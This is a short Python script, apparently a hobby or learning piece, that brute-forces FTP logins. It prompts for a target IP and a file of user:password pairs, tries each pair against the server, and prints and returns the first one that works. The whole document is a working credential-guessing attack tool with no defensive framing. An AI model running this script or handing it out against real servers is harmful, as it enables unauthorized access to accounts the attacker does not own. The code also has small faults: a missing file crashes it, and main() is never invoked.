import ftplib
from termcolor import colored

def brtueLogin(hostname,passwdFile):
  try:
    pF = open(passwdFile , "r")
  except :
    print(colored("[!] Fiile Doesnt Exist !",'red'))
  for line in pF.readlines():
    userName = line.split(":")[0]
    passWord = line.split(":")[1].strip("\n")
    print(colored("[+] Trying : "+ userName + "/" + passWord,'red'))
    try:
      ftp = ftplib.FTP(hostname)
      login = ftp.login(userName, passWord)
      print(colored("[+] Login Suceeded With :" + userName + "/" + passWord,'green'))
      ftp.quit()
      return(userName,passWord)
    except :
      pass
  print(colored("[-] Password Not In List",'red'))

def main():
  host = input(colored("[*] Enter Target IP Adress : ",'yellow'))
  passwdFile = input(colored("[*] Enter user/password File Path : ",'yellow'))
  brtueLogin(host,passwdFile)